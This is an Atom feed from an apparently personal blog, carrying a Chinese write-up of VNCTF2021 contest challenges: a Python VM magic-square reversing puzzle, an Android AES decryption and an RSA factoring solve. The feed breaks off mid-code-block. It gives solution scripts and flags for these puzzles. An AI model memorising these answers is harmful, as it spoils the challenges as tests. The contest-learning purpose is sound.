<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>H-Lither</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-03-22T05:52:42.934Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>VNCTF2021-wp</title>
    <link href="http://example.com/2021/03/22/VNCTF2021-wp/"/>
    <id>http://example.com/2021/03/22/VNCTF2021-wp/</id>
    <published>2021-03-22T05:52:36.000Z</published>
    <updated>2021-03-22T05:52:42.934Z</updated>
    
    <content type="html"><![CDATA[<p>终于有输出了，逆向做了一天。两道安卓动调试了很久很久，一道解密不出，然后发现是解密网站有问题，用脚本就可以。。一道感觉数据有问题，逆向不回去。。一道逆向爆破不出来。。。麻了。。。。</p><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="notsuduku"><a href="#notsuduku" class="headerlink" title="notsuduku"></a>notsuduku</h2><p>下载附件，发现是python应用，使用pyinstxtractor.py将文件转换成，pyc文件，修复文件头发现使用uncompyle6不能正常反编译，然后再在线<a href="http://tools.bugscaner.com/decompyle/">网址</a>尝试一波发现可以反编译，发现原来内容有日语，可能导致uncompyle6无法正常转换。</p><p>反编译内容如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time, sys, hashlib</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> あ:</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.う = &#123;&#125;</span><br><span class="line">        self.な = []</span><br><span class="line">        self.に = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        self.ぬ = []</span><br><span class="line">        self.ね = <span class="number">65</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> え(<span class="params">self, えひ</span>):</span></span><br><span class="line"> </span><br><span class="line">        <span class="function"><span class="keyword">def</span> の(<span class="params">f</span>):</span></span><br><span class="line">            self.う[えひ] = f</span><br><span class="line">            <span class="keyword">return</span> f</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> の</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> お(<span class="params">self, は</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.う.get(は)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> か(<span class="params">self</span>):</span></span><br><span class="line">        き = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            く = self.な[き][<span class="number">0</span>]</span><br><span class="line">            け = self.な[き][<span class="number">1</span>]</span><br><span class="line">            こ = self.な[き][<span class="number">2</span>]</span><br><span class="line">            さ = self.お(く)</span><br><span class="line">            さ(け, こ)</span><br><span class="line">            き += <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">い = あ()</span><br><span class="line"> </span><br><span class="line"><span class="meta">@い.え(<span class="params"><span class="string">u&#x27;\u3057&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">1</span>:</span><br><span class="line">        い.ぬ += b</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@い.え(<span class="params"><span class="string">u&#x27;\u3059&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">1</span>:</span><br><span class="line">        print(い.に)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> a == <span class="number">2</span>:</span><br><span class="line">            print(い.ぬ)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> a == <span class="number">3</span>:</span><br><span class="line">                print(い.flag, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(a, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@い.え(<span class="params"><span class="string">u&#x27;\u305b&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    sys.exit()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@い.え(<span class="params"><span class="string">u&#x27;\u305d&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    い.に = <span class="built_in">input</span>()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@い.え(<span class="params"><span class="string">u&#x27;\u305f&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    time.sleep(a)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@い.え(<span class="params"><span class="string">u&#x27;\u3061&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(い.に) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> い.に:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(i) &gt; <span class="number">52</span> <span class="keyword">or</span> <span class="built_in">ord</span>(i) &lt; <span class="number">48</span>:</span><br><span class="line">            sys.exit()</span><br><span class="line"> </span><br><span class="line">    x = <span class="built_in">str</span>(hashlib.new(<span class="string">&#x27;md5&#x27;</span>, <span class="built_in">bytes</span>(い.に, encoding=<span class="string">&#x27;utf8&#x27;</span>)).hexdigest())</span><br><span class="line">    <span class="keyword">if</span> x[:<span class="number">6</span>] != <span class="string">&#x27;e3a912&#x27;</span>:</span><br><span class="line">        sys.exit()</span><br><span class="line">    い.flag = x</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@い.え(<span class="params"><span class="string">u&#x27;\u3068&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    ふ = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(い.に), <span class="number">2</span>):</span><br><span class="line">        ふ += <span class="number">1</span></span><br><span class="line">        a = <span class="built_in">int</span>(い.に[i])</span><br><span class="line">        b = <span class="built_in">int</span>(い.に[i + <span class="number">1</span>])</span><br><span class="line">        い.ぬ[a][b] = ふ</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@い.え(<span class="params"><span class="string">u&#x27;\u3064&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> い.ぬ[<span class="number">0</span>][<span class="number">1</span>] != <span class="number">24</span> <span class="keyword">or</span> い.ぬ[<span class="number">4</span>][<span class="number">3</span>] != <span class="number">2</span>:</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">if</span> い.ぬ[<span class="number">0</span>][<span class="number">2</span>] != <span class="number">1</span> <span class="keyword">or</span> い.ぬ[<span class="number">2</span>][<span class="number">3</span>] != <span class="number">20</span>:</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">if</span> い.ぬ[<span class="number">1</span>][<span class="number">0</span>] != <span class="number">23</span> <span class="keyword">or</span> い.ぬ[<span class="number">3</span>][<span class="number">4</span>] != <span class="number">3</span>:</span><br><span class="line">        sys.exit()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@い.え(<span class="params"><span class="string">u&#x27;\u3066&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    ね = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> b == -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            ね += い.ぬ[a][i]</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> ね != い.ね:</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                ね += い.ぬ[i][b]</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> ね != い.ね:</span><br><span class="line">                sys.exit()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">い.な = [</span><br><span class="line"> [</span><br><span class="line">  <span class="string">u&#x27;\u3059&#x27;</span>, <span class="string">&#x27;welcome baby~ &#x27;</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">u&#x27;\u3059&#x27;</span>, <span class="string">&#x27;input your flag~:&#x27;</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">u&#x27;\u305d&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">u&#x27;\u3059&#x27;</span>, <span class="string">&#x27;your input is:&#x27;</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">u&#x27;\u3059&#x27;</span>, <span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">u&#x27;\u3059&#x27;</span>, <span class="string">&quot;let&#x27;s check......&quot;</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">u&#x27;\u305f&#x27;</span>, <span class="number">0.5</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">u&#x27;\u3057&#x27;</span>, <span class="number">1</span>, [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]]],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">u&#x27;\u3057&#x27;</span>, <span class="number">1</span>, [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]]],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">u&#x27;\u3057&#x27;</span>, <span class="number">1</span>, [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]]],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">u&#x27;\u3057&#x27;</span>, <span class="number">1</span>, [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]]],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">u&#x27;\u3057&#x27;</span>, <span class="number">1</span>, [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]]],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">u&#x27;\u3061&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">u&#x27;\u3068&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">u&#x27;\u3064&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">u&#x27;\u3066&#x27;</span>, <span class="number">0</span>, -<span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">u&#x27;\u3066&#x27;</span>, <span class="number">1</span>, -<span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">u&#x27;\u3066&#x27;</span>, <span class="number">2</span>, -<span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">u&#x27;\u3066&#x27;</span>, <span class="number">3</span>, -<span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">u&#x27;\u3066&#x27;</span>, <span class="number">4</span>, -<span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">u&#x27;\u3066&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">u&#x27;\u3066&#x27;</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">u&#x27;\u3066&#x27;</span>, <span class="number">0</span>, <span class="number">2</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">u&#x27;\u3066&#x27;</span>, <span class="number">0</span>, <span class="number">3</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">u&#x27;\u3066&#x27;</span>, <span class="number">0</span>, <span class="number">4</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">u&#x27;\u3059&#x27;</span>, <span class="string">&#x27;Goodjob!&#x27;</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">u&#x27;\u3059&#x27;</span>, <span class="string">&#x27;The flag is vnctf&#123;&#x27;</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">u&#x27;\u3059&#x27;</span>, <span class="number">3</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">u&#x27;\u3059&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">u&#x27;\u305b&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>]]</span><br><span class="line">い.か()</span><br></pre></td></tr></table></figure><p>慢慢分析，感觉这玩意像一个虚拟机，通过Switch分发那种。。这样想的话，这个程序就很简单了，通过第一个元素分发操作。然后先md5判断前六个字节，然后比对几个二维数组的值，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># [[0, 24, 1, 0, 0],</span></span><br><span class="line"><span class="comment"># [23, 22, 0, 0, 0]</span></span><br><span class="line"><span class="comment"># , [0, 0, 0, 20, 0]</span></span><br><span class="line"><span class="comment"># , [0, 0, 0, 0, 3],</span></span><br><span class="line"><span class="comment"># [0, 0, 0, 2, 0]]</span></span><br></pre></td></tr></table></figure><p>最后得到一个5X5的二维数组，看到5x5这种玩意，一开始以为是数独，不过题目已经提示不是了，然后搜了一下5x5横竖固定值，发现，网上有现成的答案，直接对应填入就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># [[17, 24, 1, 8, 15],</span></span><br><span class="line"><span class="comment"># [23, 5, 7, 14, 16],</span></span><br><span class="line"><span class="comment"># [4, 6, 13, 20, 22],</span></span><br><span class="line"><span class="comment"># [10, 12, 19, 21, 3],</span></span><br><span class="line"><span class="comment"># [11, 18, 25, 2, 9]]</span></span><br></pre></td></tr></table></figure><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210315015907734.png" alt="image-20210315015907734"></p><p>然后就是位置问题，ab占坑，然后有个累加器，占坑的位置存的就是此时累加器的值。</p><p>手动还原</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">02433420112112034430403122130414004132233324100142</span><br></pre></td></tr></table></figure><p>然后md5一下。</p><p>e3a912c1e911ad82544af0c3d753f44f</p><p>vnctf{e3a912c1e911ad82544af0c3d753f44f}</p><h2 id="2-carckme"><a href="#2-carckme" class="headerlink" title="2.carckme"></a>2.carckme</h2><p>安卓逆向，动调出密文，以及密钥。</p><p>直接AES解密即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">key1=[ <span class="number">0x72</span>, <span class="number">0x3B</span>, <span class="number">0xFF</span>, <span class="number">0x64</span>, <span class="number">0xCB</span>, <span class="number">0xA0</span>, <span class="number">0xE1</span>, <span class="number">0x96</span>, <span class="number">0xB0</span>, <span class="number">0x5F</span>,</span><br><span class="line">  <span class="number">0x5C</span>, <span class="number">0xF6</span>, <span class="number">0x17</span>, <span class="number">0xB0</span>, <span class="number">0x12</span>, <span class="number">0xF9</span>]</span><br><span class="line">key=<span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key1)):</span><br><span class="line">    key+=long_to_bytes(key1[i])</span><br><span class="line">key=long_to_bytes(<span class="number">0x723bff64cba0e196b05f5cf617b012f9</span>)</span><br><span class="line">cipher=[<span class="number">0xB2</span>, <span class="number">0x82</span>, <span class="number">0x16</span>, <span class="number">0xEE</span>, <span class="number">0x5E</span>, <span class="number">0xCD</span>, <span class="number">0x5F</span>, <span class="number">0xFA</span>, <span class="number">0xFF</span>, <span class="number">0x82</span>,</span><br><span class="line">  <span class="number">0x54</span>, <span class="number">0xE6</span>, <span class="number">0x0B</span>, <span class="number">0x4B</span>, <span class="number">0xAE</span>, <span class="number">0xAA</span>]</span><br><span class="line">c=<span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">    c+=long_to_bytes(cipher[i])</span><br><span class="line">flag=AES.new(key,AES.MODE_ECB)</span><br><span class="line">print(flag.decrypt(c))</span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="whitegive"><a href="#whitegive" class="headerlink" title="whitegive"></a>whitegive</h2><p>推导一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n=<span class="number">1246903000089073759886267722667196003041462505274526737638837808213476294697746018085346623497511017543801377442390781101585650581984057653018703031659844145960721073451379508212905335383758157379301019575213158532070229897587088955814288202279949391608732448294591675986989254272257059551622461096394217684402667140362275595245430242117193793913872208576714597860532581116390903216389172132085635891741189355461016795362341416848534340615825023292174042406128959</span></span><br><span class="line">c=<span class="number">952508462840095293368043281511747192551431448088755251878915582522463097721381421883702408853564036431155676272901680250701398946525803160765527940151587567521509500006089852079864042238196362897144754722623523621230744820970423076092319608853809407595863195726851921082224085255808985329769890887863865121647796115540376158135632760785321953364738008064130705467326745546629505023549047992509562623348749056757848144371814157305011884825502144329268299851210747</span></span><br><span class="line">hint=<span class="number">788785744509676701442642497798353940704045062680685297430840370664093043099033424646382070232242765761123110381200239132310785932203252095093993313010883982078216697297202940152563278231011836966627537170460186597134847633828107444548759805274516431300662852153808962421740187067058018192457264083227110866080267684557127718769967184710395811547902947248700889674967381917907905535103547918375731341071557144999864774198881339085314424766509424492349867615604684</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">p=gcd(hint*(e**e) -<span class="number">1</span>,n)</span><br><span class="line">q=n//p//p</span><br><span class="line">phi=p*(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d=invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">print(m)</span><br><span class="line"><span class="comment">#e=m=93943500165298065499950418373429723509334252629406924973909070866091749987346174290549648466771963135864917881154270768788129489671486923171733460927672763251885052132144244633336183737015936611716827476566876619327956203686756399730968768494676888428137426449681845021696056187478027217734766494935085365973</span></span><br></pre></td></tr></table></figure><p>求d用<a href="https://github.com/mimoo/RSA-and-LLL-attacks">Boneh and Durfee attack</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span 